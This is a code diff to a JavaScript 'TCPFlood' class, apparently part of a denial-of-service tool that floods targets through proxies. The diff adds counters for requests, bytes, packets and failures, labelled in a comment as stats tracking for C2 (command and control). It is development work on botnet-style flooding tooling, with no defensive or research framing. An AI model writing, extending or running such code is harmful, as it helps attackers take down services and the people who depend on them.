@@ -13,6 +13,15 @@ export class TCPFlood {
         this.duration = duration;
         this.proxies = proxies;
         this.active = true;
+        
+        // Stats tracking for C2
+        this.stats = {
+            totalRequests: 0,
+            successfulRequests: 0,
+            failedRequests: 0,
+            totalBytes: 0,
+            totalPackets: 0
+        };
     }
 
     async start() {
@@ -76,13 +85,18 @@ export class TCPFlood {
                                         REQUESTS_SENT.add(1);
                                         BYTES_SENT.add(payloadSize);
                                         bytesSent += payloadSize;
+                                        this.stats.totalRequests++;
+                                        this.stats.successfulRequests++;
+                                        this.stats.totalBytes += payloadSize;
+                                        this.stats.totalPackets++;
                                     } else {
+                                        this.stats.failedRequests++;
                                         Tools.safeClose(socket);
                                         resolve();
                                         return;
                                     }
                                 } catch (err) {
-                                    // Continue on individual packet error
+                                    this.stats.failedRequests++;
                                 }
                             }
                         } catch (err) {
